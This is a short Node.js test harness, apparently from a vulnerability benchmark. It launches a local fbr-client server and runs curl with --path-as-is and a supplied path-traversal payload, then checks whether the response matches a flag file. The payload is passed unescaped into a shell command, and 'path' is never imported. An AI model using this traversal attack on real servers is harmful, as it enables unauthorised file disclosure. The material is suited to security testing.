function exploitFunction(payload) {
    const { exec } = require("child_process");
    const fs = require("fs");
    const { sleep } = require("sleep");

    let server = "node ./node_modules/fbr-client/server.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:9001${payload}`; // Use the payload here
    exec(attack_string, (error, stdout) => {
        if (stdout === fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString()) {
            console.log("Exploit successful!");
        } else {
            console.error("Exploit failed.");
        }
    });
}

module.exports = { exploitFunction };